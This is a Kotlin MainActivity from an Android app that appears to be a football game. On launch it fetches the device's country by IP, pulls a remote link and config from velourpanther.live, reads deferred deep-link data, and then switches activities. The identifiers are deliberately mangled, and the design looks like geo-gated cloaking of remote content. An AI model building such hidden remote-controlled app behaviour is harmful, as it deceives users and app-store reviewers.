package com.gamegou.footbally

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.gamegou.footbally.ApppliacttionClass.Companion.countryCodefrrfr
import com.gamegou.footbally.ApppliacttionClass.Companion.geomeo
import com.gamegou.footbally.databinding.ActivityMainBinding
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {

    private lateinit var bindMainActfrr: ActivityMainBinding

    private suspend fun getDataDev() {

        val frrrr = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://velourpanther.live/")
            .build()
            .create(ServiceApi::class.java)
        val frfrrfgr = frrrr.getDataDev().body()?.viewgtgtt.toString()
        val appsCheckerfgtt = frrrr.getDataDev().body()?.appsCheckergtgtt.toString()
        val retroDatafrffr = frrrr.getDataDev().body()?.geofgtt.toString()


        Hawk.put(ApppliacttionClass.linkfrrr, frfrrfgr)
        Hawk.put(ApppliacttionClass.appsCheckfrr, appsCheckerfgtt)
        Hawk.put(geomeo, retroDatafrffr)

    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindMainActfrr = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainActfrr.root)

        frgtttg(this)

        val frfrrr = Executors.newSingleThreadScheduledExecutor()
        var ffgtgtt: String? = Hawk.get(countryCodefrrfr, null)
        var ge: String? = Hawk.get(geomeo, null)
        frfrrr.scheduleAtFixedRate({
            if (ffgtgtt != null && ge != null) {
                frfrrr.shutdown()
                gttgtth()
            } else {
                ffgtgtt = Hawk.get(countryCodefrrfr)
                ge = Hawk.get(geomeo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            frfrrfrf
        }
    }




    private suspend fun getDatafrgtt() {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCodefgtgt

        Hawk.put(countryCodefrrfr, retData)
    }

    private val frfrrfrf: Job = GlobalScope.launch(Dispatchers.IO) {
        getDatafrgtt()
        getDataDev()
    }

    private fun gttgtth() {
        val frfrgrt = Intent(this@MainActivity, AdddaaadddActivity::class.java)
        startActivity(frfrgrt)
        finish()
    }

    fun frgtttg(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val popopop = appLinkData.targetUri.host.toString()
                Hawk.put(ApppliacttionClass.DEEPLfrfr, popopop)
            }
            if (appLinkData == null) {
            }
        }
    }
}